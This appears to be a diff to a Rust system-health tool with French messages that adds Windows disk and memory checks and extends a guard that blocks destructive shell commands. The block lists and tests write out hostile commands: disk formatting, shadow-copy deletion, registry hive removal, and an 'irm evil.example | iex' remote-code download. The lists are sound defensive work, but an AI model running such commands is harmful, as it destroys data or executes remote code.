@@ -26,6 +26,39 @@ fn constat(id: &str, g: &'static str, titre: &str, detail: String, conseil: &str
 }
 
 fn check_disk() -> Vec<Constat> {
+    #[cfg(windows)]
+    {
+        let mut v = vec![];
+        for (mount, total, dispo) in crate::os::win::disques() {
+            if total == 0 {
+                continue;
+            }
+            let pc = ((total.saturating_sub(dispo)) as f64 / total as f64 * 100.0).round() as u32;
+            let free_gb = dispo as f64 / 1024f64.powi(3);
+            if pc >= 95 {
+                v.push(constat(
+                    &format!("disque:{mount}"),
+                    "critique",
+                    t!("Disque presque plein"),
+                    t!("{} est plein à {} % (reste {} Go).", mount, pc, format!("{free_gb:.1}")),
+                    t!("Libère de l'espace : gros fichiers, caches, corbeille."),
+                    "cleanmgr",
+                ));
+            } else if pc >= 90 {
+                v.push(constat(
+                    &format!("disque:{mount}"),
+                    "attention",
+                    t!("Espace disque faible"),
+                    t!("{} est utilisé à {} % (reste {} Go).", mount, pc, format!("{free_gb:.1}")),
+                    t!("Repère les plus gros dossiers."),
+                    "cleanmgr",
+                ));
+            }
+        }
+        return v;
+    }
+    #[cfg(not(windows))]
+    {
     let home = crate::paths::home_dir();
     let Some(out) = run("df", &["-P", "/", &home.to_string_lossy()]) else { return vec![] };
     let mut v = vec![];
@@ -48,9 +81,14 @@ fn check_disk() -> Vec<Constat> {
         }
     }
     v
+    }
 }
 
 fn check_failed_services() -> Vec<Constat> {
+    #[cfg(windows)]
+    return vec![];
+    #[cfg(not(windows))]
+    {
     let mut v = vec![];
     for (scope, flag) in [("utilisateur", "--user"), ("système", "--system")] {
         let Some(out) = run("systemctl", &[flag, "--failed", "--no-legend", "--plain"]) else { continue };
@@ -73,6 +111,7 @@ fn check_failed_services() -> Vec<Constat> {
         ));
     }
     v
+    }
 }
 
 fn check_updates() -> Vec<Constat> {
@@ -110,6 +149,24 @@ fn check_journal() -> Vec<Constat> {
 }
 
 fn check_memory() -> Vec<Constat> {
+    #[cfg(windows)]
+    {
+        let Some((total, avail)) = crate::os::win::memoire_vive() else { return vec![] };
+        let pc = avail as f64 / total as f64 * 100.0;
+        if pc >= 8.0 {
+            return vec![];
+        }
+        return vec![constat(
+            "memoire",
+            "attention",
+            t!("Mémoire presque saturée"),
+            t!("Il ne reste que {} Go de mémoire vive ({} %).", format!("{:.1}", avail as f64 / 1024f64.powi(3)), format!("{pc:.0}")),
+            t!("Ferme les applications les plus gourmandes."),
+            "Get-Process | Sort-Object WorkingSet64 -Descending | Select-Object -First 8 Id, ProcessName, @{N='Mo';E={[math]::Round($_.WorkingSet64/1MB)}}",
+        )];
+    }
+    #[cfg(not(windows))]
+    {
     let info = std::fs::read_to_string("/proc/meminfo").unwrap_or_default();
     let kb = |k: &str| info.lines().find_map(|l| l.strip_prefix(k)).and_then(|v| v.split_whitespace().next()?.parse::<f64>().ok());
     let (Some(total), Some(avail)) = (kb("MemTotal:"), kb("MemAvailable:")) else { return vec![] };
@@ -120,6 +177,7 @@ fn check_memory() -> Vec<Constat> {
     vec![constat("memoire", "attention", t!("Mémoire presque saturée"),
         t!("Il ne reste que {} Go de mémoire vive ({} %).", format!("{:.1}", avail / 1024.0 / 1024.0), format!("{pc:.0}")),
         t!("Ferme les applications les plus gourmandes."), "ps -eo pid,comm,%mem --sort=-%mem | head -8")]
+    }
 }
 
 /// Lance toutes les vérifications (lecture seule, sans sudo).
@@ -159,6 +217,12 @@ fn go(o: u64) -> String {
 pub fn bilan_semaine() -> String {
     let home = crate::paths::home_dir();
     let mut l = vec![];
+    #[cfg(windows)]
+    for (nom, tot, dispo) in crate::os::win::disques() {
+        let pc = format!("{}%", (tot.saturating_sub(dispo) as f64 / tot as f64 * 100.0).round() as u32);
+        l.push(t!("Disque {} : {} libres ({} utilisé)", nom, go(dispo), pc));
+    }
+    #[cfg(not(windows))]
     if let Some(o) = run("df", &["-h", "--output=target,avail,pcent", "/", &home.to_string_lossy()]) {
         let mut vus = vec![];
         for x in o.lines().skip(1) {
@@ -171,8 +235,12 @@ pub fn bilan_semaine() -> String {
     }
     let cache = taille(&home.join(".cache"));
     let corbeille = taille(&home.join(".local/share/Trash"));
-    if cache > 0 {
-        l.push(t!("Cache de tes applications : {}", go(cache)));
+    #[cfg(windows)]
+    let temp = std::env::var_os("TEMP").map(std::path::PathBuf::from).map(|p| taille_win(&p)).unwrap_or(0);
+    #[cfg(not(windows))]
+    let temp = 0u64;
+    if cache + temp > 0 {
+        l.push(t!("Cache de tes applications : {}", go(cache + temp)));
     }
     if corbeille > 50 * 1024 * 1024 {
         l.push(t!("Corbeille : {}", go(corbeille)));
@@ -221,11 +289,32 @@ pub fn bilan_texte() -> String {
 
 // --- garde-fous des commandes ---------------------------------------------------
 
+#[cfg(windows)]
+fn taille_win(dossier: &std::path::Path) -> u64 {
+    let Ok(rd) = std::fs::read_dir(dossier) else { return 0 };
+    rd.flatten().take(400).filter_map(|e| e.metadata().ok()).filter(|m| m.is_file()).map(|m| m.len()).sum()
+}
+
 /// Commandes refusées quoi qu'il arrive.
 pub fn dangereuse(cmd: &str) -> bool {
     let c = cmd.to_lowercase().split_whitespace().collect::<Vec<_>>().join(" ");
     let roots = ["rm -rf /", "rm -rf /*", "rm -rf ~", "rm -rf $home", "rm -fr /", "rm -rf --no-preserve-root"];
+    let win_bad = [
+        "format c:", "format-volume", "clear-disk", "initialize-disk", "diskpart", "cipher /w:",
+        "bcdedit /delete", "vssadmin delete shadows", "wbadmin delete",
+        "rd /s /q c:\\", "rmdir /s /q c:\\", "del /f /s /q c:\\",
+        "reg delete hklm\\system", "reg delete hklm\\sam", "reg delete hklm\\security",
+        "reg delete hklm\\software\\microsoft\\windows",
+    ];
+    let win_rm = c.contains("remove-item") && (c.contains("-recurse") || c.contains(" -r")) && [r"c:\", "c:/", "$env:systemroot", "$env:windir"].iter().any(|r| {
+        c.ends_with(r) || c.contains(&format!("{r} ")) || c.contains(&format!("'{r}'")) || c.contains(&format!("\"{r}\""))
+    });
+    let win_iex = (c.contains("iwr ") || c.contains("invoke-webrequest") || c.contains("irm ") || c.contains("invoke-restmethod") || c.contains("downloadstring"))
+        && (c.contains("| iex") || c.contains("|iex") || c.contains("invoke-expression"));
     roots.iter().any(|r| c == *r || c.starts_with(&format!("{r} ")) || c.contains(&format!("{r};")))
+        || win_bad.iter().any(|b| c.contains(b))
+        || win_rm
+        || win_iex
         || c.contains(":(){")
         || c.contains(":() {")
         || (c.contains("mkfs") && c.contains("/dev/"))
@@ -233,14 +322,16 @@ pub fn dangereuse(cmd: &str) -> bool {
         || c.contains("> /dev/sd")
         || c.contains("> /dev/nvme")
         || c.contains("chmod -r 777 /")
-        || c.contains("chown -r") && c.contains(" /")  && c.trim_end().ends_with(" /")
+        || c.contains("chown -r") && c.contains(" /") && c.trim_end().ends_with(" /")
 }
 
 /// Commandes autorisées mais irréversibles : on le signale dans la confirmation.
 pub fn irreversible(cmd: &str) -> bool {
     let c = format!(" {} ", cmd.to_lowercase());
     [" rm ", " rmdir ", " shred ", " unlink ", " truncate ", " mkswap ", " wipefs ", " fdisk ", " parted ",
-     " kill ", " pkill ", " killall ", "reset --hard", "clean -f", "clean -df", "push --force", "push -f ", " chmod -r ", " chown -r "]
+     " kill ", " pkill ", " killall ", "reset --hard", "clean -f", "clean -df", "push --force", "push -f ", " chmod -r ", " chown -r ",
+     " del ", " erase ", " rd /s", " remove-item ", " clear-recyclebin", " reg delete ", " reg add ",
+     " stop-process ", " taskkill ", " stop-computer", " restart-computer", "winget uninstall", "scoop uninstall", "choco uninstall"]
         .iter()
         .any(|p| c.contains(p))
 }
@@ -322,6 +413,20 @@ mod tests {
         assert!(!dangereuse("rm -rf ~/build/target"));
         assert!(irreversible("rm -rf ~/build/target"));
         assert!(!irreversible("ls -la"));
+    }
+
+    #[test]
+    fn windows_dangerous() {
+        assert!(dangereuse("format C: /fs:ntfs /q"));
+        assert!(dangereuse("Clear-Disk -Number 0 -RemoveData"));
+        assert!(dangereuse("rd /s /q C:\\"));
+        assert!(dangereuse("Remove-Item -Recurse -Force C:\\"));
+        assert!(dangereuse("vssadmin delete shadows /all /quiet"));
+        assert!(dangereuse("irm https://evil.example/x.ps1 | iex"));
+        assert!(irreversible("Remove-Item brouillon.txt"));
+        assert!(irreversible("winget uninstall Foo.Bar"));
+        assert!(!dangereuse("Get-ChildItem $HOME\\Documents"));
+        assert!(!irreversible("Get-ChildItem $HOME\\Documents"));
     }
 
     #[test]
